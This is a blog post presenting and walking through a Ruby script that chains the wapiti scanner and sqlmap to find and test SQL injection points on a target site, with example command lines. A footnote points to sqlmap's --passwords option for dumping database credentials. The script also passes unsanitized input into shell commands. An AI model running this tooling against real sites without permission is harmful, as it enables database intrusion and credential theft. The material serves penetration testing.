---
layout: post
title: "Fast SQLi Scanning and Beyond"
description: ""
category: 
tags: []
---
{% include JB/setup %}

Quite a bit of SQL injection going on in these past few weeks. Interesting how when you are doing something it seems like suddenly everyone[^0] is talking about it. Of course, SQLi is one of the [OWASP Top 10][OWASP], so it's pretty common to hear about. Now I have started to cook together some guides on my favorite SQLi automated tools in a 101 type of capacity, but I came across this, and it was just so cool that I am going to have to post it first, and come back to the one-o-one stuff later. What this script does in essence is connect [wapiti][wapiti] speed with the depth of [sqlmap][sqlmap]. Snazzy idea, great execution. The upshot of this little ruby snippet is a very very fast and fairly accurate sqli vulnerability finder, *and* suggested exploit paths, *and* potentially[^1] popping the DB right there. Nice!

So for the tl;dr[^2] crowd, here is the script, left mostly intact from [Volatile Minds][VM]. Big props for writing this, [Brandon][bdon]!

{% highlight ruby linenos %}

#!/usr/bin/env ruby

## Requires wapiti, SQLMap
 
require 'active_support/secure_random'
require 'rexml/document'
 
puts "enter path to wapiti src: "
wapiti_path = gets
#wapiti_path = '/path/to/wapiti/trunk/src/'

puts "enter path to sqlmap: "
sqlmap_path = gets
#sqlmap_path = '/path/to/sqlmap/'
 
wapiti_report_path = '/tmp/wapiti_report_' + SecureRandom.uuid + '.xml'
 
remote_host = ARGV[0]
 
p "Running wapiti..."
`#{wapiti_path}wapiti.py #{ARGV[0]} -f xml -o #{wapiti_report_path}`
 
p "Report saved to #{wapiti_report_path}"
 
p "Parsing results"
 
results = []
 
report = ::File.open(wapiti_report_path, "rb")
doc = REXML::Document.new report.read
 
doc.elements.each('/report/bugTypeList/bugType') do |element|
        bug_type = element.attributes["name"]
 
        next if bug_type != "SQL Injection"
 
        p "Parsing " + bug_type
 
        result = {}
        element.elements.each("bugList/bug") do |bug|
                result[:type] = bug_type
               
                bug.elements.each do |child|
                        if child.name == "url"
                                result[:url] = child.text
                        elsif child.name == "parameter"
                                result[:parameter] = child.text
                        end
                end
                results << result
                result = {}
        end
end
 
results.each do |result|
        next if result[:type] !~ /SQL Injection/
        p "Running sqlmap"
       
        if result[:url].index(result[:parameter])
                url = result[:url].gsub("%BF%27%22%28", "abcd")
       
                params = result[:url].split("?")[1].split("&")
 
                skipped_params = []
                params.each do |param|
                        skipped_params << param.split("=")[0] if not param.index("%BF%27%22%28")
                end
                       
                p "Running GET sql injection test on url: " + url
                sqlmap_command = "#{sqlmap_path}sqlmap.py -u \"#{url}\" --smart --skip=\"#{skipped_params.join(",")}\" --technique=EUS --flush-session --fresh-queries --level=2 --batch"
                out = `#{sqlmap_command}`
                printf out
        else
                url = result[:url]
                p "Running POST sql injection test on url: " + url
                p "With data: " + result[:parameter]
 
                parameter = result[:parameter].gsub("%BF%27%22%28", "abcd")
 
                params = result[:parameter].split("&")
 
                skipped_params = []
                params.each do |param|
                        skipped_params << param.split("=")[0] if not param.index("%BF%27%22%28")
                end
 
                sqlmap_command = "#{sqlmap_path}sqlmap.py -u \"#{url}\" --data=\"#{parameter}\"  --skip=\"#{skipped_params.join(",")}\" --smart --technique=EUS --flush-session --fresh-queries --level=2 --batch"
                p sqlmap_command
                sqlmap_output = `#{sqlmap_command}`
               
                printf sqlmap_output
        end
end
{% endhighlight %}

You can pretty much run it as is[^3], if you can read the code enough to make the few basic alterations you need. It takes one argument, the site you want to hit. Now we can take this apart and see how it works.

You need to specify in the script the path to your tools. Why security tools cannot be written to run from bin in your standard PATH will have to wait for another rant. I added that little bit that will ask you for your fully qualified path to these tools. Useful for first time running, comment out and hardcode it in for extended use. Just don't forget and move your tools to a new location! Basically it runs a wapiti command like this:


{% highlight bash %}
wapiti.py http://example.com/ -f xml -o /tmp/wapiti_report_randomstuff.xml
{% endhighlight %}
    
Which basically just turns wapiti onto a site and saves the output to xml. Alrighty. It then performs some ruby fu, parses out the potentially vulnerable urls and injection points, decides if it is a GET or POST, and the passes it to sqlmap. Sqlmap then runs a couple of tests on the injection point, either classic GET, or a POST, depending on the vulnerability that wapiti has identified. It does this for every vulnerability that wapiti finds, too. So all that sqlmap helpfulness is available to us at every potential injection point. Sounds like a dream. The commands look like this for the interested, this is the GET one. The POST version is similar.

{% highlight bash %}
sqlmap.py -u http://example.com/?id=1 --smart --skip=skip,this,one --technique=EUS --flush-session --fresh-queries --level=2 --batch
{% endhighlight %}

It will kindly kick out the results to stdin. Of course if you like to save these kinds of things (like for evidence logs in a pen test) you can always pipe it out somewhere. So like I said. Slick.

Of course these comments on this script are totally valid:

* But I love using sqlmap to scan for stuff! Cool. Go with what works for you.
* There are so many more options, this script just limits these programs. You are right. This tool is built for speed and hits stuff with hammers. Pen testing surgeons should come back later.
* My grandaddy taught me to only exploit SQLi by hand! Again, whatever works. I am just trying to use this tool to add value to my tests by automating discovery.

For a wrapup, I certainly enjoyed using this script, hope y'all do to. I will be adding it to my trove of similar hacks that smart people put together so that I can be a little more lazy.

***
[^0]: Ok probably not everyone.
[^1]: Disclaimer, you would have to edit the query in the code to actually pop the databases and not just confirm. Also, this is probably a terrible idea... maybe... trying to talk myself out of trying it... `--passwords`
[^2]: I know you are out there
[^3]: If I hear from alot of people that they don't have the required portions, I may detail where/how to get them

[bdon]: https://twitter.com/#!/BrandonPrry
[wapiti]: http://wapiti.sourceforge.net/
[sqlmap]: http://sqlmap.sourceforge.net/
[OWASP]: https://www.owasp.org/index.php/Top_10_2010
[VM]: http://volatile-minds.blogspot.com/